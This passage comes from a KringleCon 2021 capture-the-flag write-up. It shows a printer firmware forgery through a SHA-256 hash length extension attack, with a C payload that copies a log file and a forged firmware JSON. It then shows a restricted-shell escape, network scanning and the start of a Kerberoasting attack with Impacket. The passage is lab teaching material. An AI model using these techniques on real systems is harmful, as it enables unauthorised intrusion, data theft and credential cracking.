+</code></pre></div><p>The firmware is really a JSON file containing the actual <code>firmware</code> blob in base64. The <code>signature</code> is a hash which signs the whole firmware blob together with an unknown secret string which has 16 bytes (<code>secret_length</code>). The signing is performed using a SHA-256 <code>algorithm</code>.</p><p>Few notes about signing: New signature can be created with formula sig = SHA-256(secret + firmware_blob). Only the original developer and server know the secret code, and that&rsquo;s how the server validates if the newly uploaded firmware is from a legit source.</p><p>Let&rsquo;s unpack the base64 binary blob</p><div class=highlight><pre style=background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback>$ cat firmware-export.json | jq -r &#39;.firmware&#39; | base64 -d &gt; firmware_decoded
+$ file firmware_decoded
+firmware_decoded: Zip archive data, at least v2.0 to extract, compression method=deflate
+</code></pre></div><p>It appears to be a zip file</p><div class=highlight><pre style=background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback>$ unzip firmware_decoded
+  inflating: firmware.bin
+$ file firmware.bin
+firmware.bin: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=fc77960dcdd5219c01440f1043b35a0ef0cce3e2, not stripped
+</code></pre></div><p>The unziped binary is called <code>firmware.bin</code>, and it is just a standard linux executable.</p><div class=highlight><pre style=background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback>$ ./firmware.bin 
+Firmware is fully up to date!
+</code></pre></div><p>That&rsquo;s it. All it does is print this message. We can further confirm this by dissecting the binary</p><div class=highlight><pre style=background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-hexdump data-lang=hexdump><span>$</span> <span>objdump</span> <span>-M</span> <span>intel</span> <span>--disassemble=main</span> <span>firmware.bin</span>
+<span style=color:#a0a000>0000000000001135</span> <span>&lt;main&gt;:</span>
+    <span style=color:#666>1135</span><span>:</span>	<span style=color:#666>55</span>          <span style=color:#b44>         	push   rbp</span>
+    <span style=color:#666>1136</span><span>:</span>	<span style=color:#666>48</span> <span style=color:#666>89</span> <span style=color:#666>e5</span>        <span style=color:#b44>     	mov    rbp,rsp</span>
+    <span style=color:#666>1139</span><span>:</span>	<span style=color:#666>48</span> <span style=color:#666>83</span> <span style=color:#666>ec</span> <span style=color:#666>10</span>      <span style=color:#b44>    	sub    rsp,0x10</span>
+    <span style=color:#666>113d</span><span>:</span>	<span style=color:#666>89</span> <span style=color:#666>7d</span> <span style=color:#666>fc</span>             	<span>mov</span>    <span>DWORD</span> <span>PTR</span> <span>[rbp-0x4],</span><span style=color:#666>ed</span><span>i</span>
+    <span style=color:#666>1140</span><span>:</span>	<span style=color:#666>48</span> <span style=color:#666>89</span> <span style=color:#666>75</span> <span style=color:#666>f0</span>          	<span>mov</span>    <span>QWORD</span> <span>PTR</span> <span>[rbp-0x</span><span style=color:#666>10</span><span>],rsi</span>
+    <span style=color:#666>1144</span><span>:</span>	<span style=color:#666>48</span> <span style=color:#666>8d</span> <span style=color:#666>3d</span> <span style=color:#666>b9</span> <span style=color:#666>0e</span> <span style=color:#666>00</span> <span style=color:#666>00</span> 	<span>l</span><span style=color:#666>ea</span>   <span style=color:#b44> rdi,[rip+0xeb9]</span>
+    <span style=color:#666>114b</span><span>:</span>	<span style=color:#666>e8</span> <span style=color:#666>e0</span> <span style=color:#666>fe</span> <span style=color:#666>ff</span> <span style=color:#666>ff</span>       	<span style=color:#666>ca</span><span>ll</span>   <span style=color:#b44>1030 &lt;puts@plt&gt;</span>
+    <span style=color:#666>1150</span><span>:</span>	<span style=color:#666>b8</span> <span style=color:#666>00</span> <span style=color:#666>00</span> <span style=color:#666>00</span> <span style=color:#666>00</span>   <span style=color:#b44>    	mov    eax,0x0</span>
+    <span style=color:#666>1155</span><span>:</span>	<span style=color:#666>c9</span>                   	<span style=color:#b44>leave  </span>
+    <span style=color:#666>1156</span><span>:</span>	<span style=color:#666>c3</span>                   	<span style=color:#b44>ret</span>
+</code></pre></div><h3 id=planning-the-exploit><strong>Planning the exploit</strong> <a href=#planning-the-exploit class=anchor>🔗</a></h3><p>The goal is to retrieve the contents of the file <code>/var/spool/printer.log</code>. In order to do so, we could create a new firmware that copies this file to another location <code>/app/lib/public/incoming</code>, which is publicly accesible from the outside. Then it is just a matter of grabbing that file with a simple GET request.</p><p>There is one problem though. A firmware needs to be signed with a correct 16 bytes secret string. We don&rsquo;t know this code, however we don&rsquo;t need to if we apply the <a href=https://en.wikipedia.org/wiki/Length_extension_attack target=_blank rel=noopener>hash length extension attack
+</a>. The main idea is to take the original firmware, padd it to fill in the entire block, then on the next block append to it our malicious firmware. To produce a valid signature, hashing is done on the malicious firmware with the initial state set to that of the previously known signature. This way, we are sort of continuing where we &ldquo;left off&rdquo;. This process can be automated with utility <a href=https://github.com/iagox86/hash_extender target=_blank rel=noopener>hash_extender</a></p><p>The attack vector can be summarized in these 6 steps</p><ol><li>Create payload pwned.c</li><li>Compile it as firmware.bin and zip it</li><li>Run hash_extender on it with known signature</li><li>Create file <code>mal_firmware.json</code> with newly generated signature and payload</li><li>Update the firmware</li><li>Curl printer.kringlecastle.com/incoming/pwned</li></ol><h3 id=crafting-the-payload><strong>Crafting the payload</strong> <a href=#crafting-the-payload class=anchor>🔗</a></h3><p>I opted for the simplest solution using the <code>system()</code> function to execute the shell command</p><div class=highlight><pre style=background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=color:#080>#include</span> <span style=color:#080>&lt;stdlib.h&gt;</span><span style=color:#080>
+</span><span style=color:#080></span>
+<span style=color:#0b0;font-weight:700>int</span> <span style=color:#00a000>main</span>(<span style=color:#0b0;font-weight:700>void</span>)
+{
+    <span style=color:#0b0;font-weight:700>char</span> <span style=color:#666>*</span>cmd <span style=color:#666>=</span> <span style=color:#b44>&#34;cp /var/spool/printer.log /app/lib/public/incoming/pwned&#34;</span>;
+    system(cmd);
+    <span style=color:#a2f;font-weight:700>return</span> <span style=color:#666>0</span>;
+}
+</code></pre></div><div class=highlight><pre style=background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=color:#080;font-style:italic># compile pwned.c as a new malicious firmware.bin</span>
+$ gcc pwned.c -o firmware.bin
+<span style=color:#080;font-style:italic># make sure it is executable by other group</span>
+$ chmod o+rx firmware.bin
+<span style=color:#080;font-style:italic># zip it</span>
+$ zip mal_firmware.zip firmware.bin
+<span style=color:#080;font-style:italic># convert to hex format for use in hash_extender</span>
+$ <span style=color:#b8860b>payload</span><span style=color:#666>=</span><span style=color:#a2f;font-weight:700>$(</span>xxd -p mal_firmware.zip | tr -d <span style=color:#b44>&#39;\n&#39;</span><span style=color:#a2f;font-weight:700>)</span>
+</code></pre></div><p>Execute hash extender</p><div class=highlight><pre style=background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>$ ./hash_extender --file firmware_decoded --format sha256 --secret <span style=color:#666>16</span> --append <span style=color:#b8860b>$payload</span> --append-format hex --signature 2bab052bf894ea1a255886fde202f451476faba7b941439df629fdeb1ff0dc97
+Type: sha256
+Secret length: <span style=color:#666>16</span>
+New signature: a33d128509a63985fd55545d5962d76e7b464a7148cf3d9af2db7d68f5587d1f
+New string: 504b030414000000080045a5905316a0...................................
+</code></pre></div><p>We have a new valid signature. All that is left is to convert the newly output string (payload) from hex into raw file, base64 encode it, and paste all that into <code>mal_firmware.json</code></p><div class=highlight><pre style=background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback>$ echo -n &#39;504b030414...&#39; | xxd -r -p | base64 | tr -d &#39;\n&#39;
+</code></pre></div><p>Here is the final <code>mal_firmware.json</code> file.</p><div class=highlight><pre style=background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-json data-lang=json>{
+  <span style=color:green;font-weight:700>&#34;firmware&#34;</span>: <span style=color:#b44>&#34;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&#34;</span>,
+  <span style=color:green;font-weight:700>&#34;signature&#34;</span>: <span style=color:#b44>&#34;a33d128509a63985fd55545d5962d76e7b464a7148cf3d9af2db7d68f5587d1f&#34;</span>,
+  <span style=color:green;font-weight:700>&#34;secret_length&#34;</span>: <span style=color:#666>16</span>,
+  <span style=color:green;font-weight:700>&#34;algorithm&#34;</span>: <span style=color:#b44>&#34;SHA256&#34;</span>
+}
+</code></pre></div><p>After uploading this file to the firmware update page, it successfully passes the validation and executes in the background.</p><p><p class=markdown-image><img src=/images/kringlecon-2021/printer-success.png alt=printer-success></p></p><p>If everything was setup correctly, we should have our <code>printer.log</code> file copied to the incoming folder as file <code>pwned</code>. Time for a final curl request.</p><div class=highlight><pre style=background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback>$ curl https://printer.kringlecastle.com/incoming/pwned
+Documents queued for printing
+=============================
+
+Biggering.pdf
+Size Chart from https://clothing.north.pole/shop/items/TheBigMansCoat.pdf
+LowEarthOrbitFreqUsage.txt
+Best Winter Songs Ever List.doc
+Win People and Influence Friends.pdf
+Q4 Game Floor Earnings.xlsx
+Fwd: Fwd: [EXTERNAL] Re: Fwd: [EXTERNAL] LOLLLL!!!.eml
+Troll_Pay_Chart.xlsx
+</code></pre></div><p>Answer: <strong>Troll_Pay_Chart.xlsx</strong></p><h2 id=objective-8---kerberoasting-on-an-open-fire>Objective 8 - Kerberoasting on an Open Fire <a href=#objective-8---kerberoasting-on-an-open-fire class=anchor>🔗</a></h2><p><strong>Task:</strong> <em>Obtain the secret sleigh research document from a host on the Elf University domain. What is the first secret ingredient Santa urges each elf and reindeer to consider for a wonderful holiday season? Start by registering as a student on the ElfU Portal. Find Eve Snowshoes in Santa&rsquo;s office for hints.</em></p><p>The first step is to register at Elf University <a href=https://register.elfu.org/register target=_blank rel=noopener>portal
+</a>. After our account is created, we get SSH credentials.</p><p><p class=markdown-image><img src=/images/kringlecon-2021/elfu-registration.png alt=elfu></p></p><p>Upon SSHing into the server, we are presented with an ELFU student grades app. This app is restricted in that it only permits printing the grades or completely exiting the app and closing the connection. Anything we type is going to be stripped (except the exit command).</p><div class=highlight><pre style=background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback>===================================================
+=      Elf University Student Grades Portal       =
+=          (Reverts Everyday 12am EST)            =
+===================================================
+1. Print Current Courses/Grades.
+e. Exit
+: 
+</code></pre></div><p>This task is about escaping into shell. Since this is a Python application, we can attempt to exit out of the app by pressing <code>Ctrl + D</code>. The app does not handle this signal properly and crashes.</p><div class=highlight><pre style=background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback>===================================================
+=      Elf University Student Grades Portal       =
+=          (Reverts Everyday 12am EST)            =
+===================================================
+1. Print Current Courses/Grades.
+e. Exit
+: Traceback (most recent call last):
+  File &#34;/opt/grading_system&#34;, line 41, in &lt;module&gt;
+    main()
+  File &#34;/opt/grading_system&#34;, line 26, in main
+    a = input(&#34;: &#34;).lower().strip()
+EOFError
+&gt;&gt;&gt;
+</code></pre></div><p>Great, the app crashed and we are now in a Python shell. The bash shell can be obtained by a single call to python <code>system()</code> function.</p><div class=highlight><pre style=background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>&gt;&gt;&gt; import os
+&gt;&gt;&gt; os.system<span style=color:#666>(</span><span style=color:#b44>&#39;/bin/bash&#39;</span><span style=color:#666>)</span>
+zotmtazbsi@grades:~$ 
+</code></pre></div><p>It is a good idea to change our login shell permanently. Next time we login, we&rsquo;re jumping straight into bash shell.</p><div class=highlight><pre style=background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>zotmtazbsi@grades:~$ <span style=color:#a2f>echo</span> <span style=color:#b8860b>$SHELL</span>
+/opt/grading_system
+zotmtazbsi@grades:~$ chsh -s /bin/bash zotmtazbsi
+zotmtazbsi@grades:~$ <span style=color:#a2f>echo</span> <span style=color:#b8860b>$SHELL</span>
+/bin/bash
+</code></pre></div><p>With the initial foothold gained, it&rsquo;s time for a bit of recon.</p><h3 id=nmap-all-the-things><strong>Nmap all the things!</strong> <a href=#nmap-all-the-things class=anchor>🔗</a></h3><p>Our IP is 172.17.0.2. Let&rsquo;s scan the whole range</p><div class=highlight><pre style=background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback>zotmtazbsi@grades:~$ nmap 172.17.0.1-255 -v
+Nmap scan report for 172.17.0.1
+Host is up (0.00061s latency).
+Not shown: 997 closed ports
+PORT     STATE SERVICE
+22/tcp   open  ssh
+80/tcp   open  http
+2222/tcp open  EtherNetIP-1
+
+Nmap scan report for grades.elfu.local (172.17.0.2)
+Host is up (0.00061s latency).
+Not shown: 998 closed ports
+PORT   STATE SERVICE
+22/tcp open  ssh
+80/tcp open  http
+
+Nmap scan report for 172.17.0.3
+Host is up (0.00059s latency).
+Not shown: 998 closed ports
+PORT    STATE SERVICE
+139/tcp open  netbios-ssn
+445/tcp open  microsoft-ds
+
+Nmap scan report for 172.17.0.4
+Host is up (0.00066s latency).
+Not shown: 988 closed ports
+PORT     STATE SERVICE
+42/tcp   open  nameserver
+53/tcp   open  domain
+88/tcp   open  kerberos-sec
+135/tcp  open  msrpc
+139/tcp  open  netbios-ssn
+389/tcp  open  ldap
+445/tcp  open  microsoft-ds
+464/tcp  open  kpasswd5
+636/tcp  open  ldapssl
+1024/tcp open  kdm
+3268/tcp open  globalcatLDAP
+3269/tcp open  globalcatLDAPssl
+
+Nmap scan report for 172.17.0.5
+Host is up (0.00064s latency).
+Not shown: 998 closed ports
+PORT    STATE SERVICE
+139/tcp open  netbios-ssn
+445/tcp open  microsoft-d
+</code></pre></div><p>The interesting IP here is <code>172.17.0.4</code>. Among many services, it is running a SAMBA server. Let&rsquo;s use <code>smbclient</code> to list any available shares.</p><div class=highlight><pre style=background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback>afirxhawbs@grades:~$ smbclient -L 172.17.0.4
+Enter WORKGROUP\zotmtazbsi&#39;s password: 
+
+	Sharename       Type      Comment
+	---------       ----      -------
+	netlogon        Disk      
+	sysvol          Disk      
+	elfu_svc_shr    Disk      elfu_svc_shr
+	research_dep    Disk      research_dep   &lt;----------
+	IPC$            IPC       IPC Service (Samba 4.3.11-Ubuntu)
+</code></pre></div><p>The document we are looking for might be located somewhere inside the <code>research_dep</code> share. However, as of now we don&rsquo;t have the required permissions to connect to any of the shares above.</p><h3 id=kerberoasting><strong>Kerberoasting</strong> <a href=#kerberoasting class=anchor>🔗</a></h3><p>By performing the so called Kerberoasting attack, we will get passwords from all the vulnerable service accounts. We can then use this new password(s) to authenticate against the service.</p><p>The attack goes roughly like this:</p><ul><li>Scan Active Directory for user accounts with SPN values set</li><li>Request service tickets from AD using SPN values</li><li>Extract service tickets to memory and save to a file</li><li>Perform offline brute force attack to crack the saved tickets</li></ul><p>Luckily, the first three steps can be automated with a tool such as <a href=https://github.com/SecureAuthCorp/impacket target=_blank rel=noopener>Impacket</a> for example. The suite contains the script <code>GetUserSPNS.py</code> which does exactly that.</p><div class=highlight><pre style=background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback>zotmtazbsi@grades:~$ GetUserSPNs.py elfu.local/zotmtazbsi:Jcywntifp@ -outputfile ticket
+Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation
+
+ServicePrincipalName                 Name      MemberOf  PasswordLastSet             LastLogon                   Delegation 
+-----------------------------------  --------  --------  --------------------------  --------------------------  ----------
+ldap/elfu_svc/elfu                   elfu_svc            2021-10-29 19:25:04.305279  2021-12-16 09:04:53.004781             
+ldap/elfu_svc/elfu.local             elfu_svc            2021-10-29 19:25:04.305279  2021-12-16 09:04:53.004781             
+ldap/elfu_svc.elfu.local/elfu        elfu_svc            2021-10-29 19:25:04.305279  2021-12-16 09:04:53.004781             
+ldap/elfu_svc.elfu.local/elfu.local  elfu_svc            2021-10-29 19:25:04.305279  2021-12-16 09:04:53.004781             
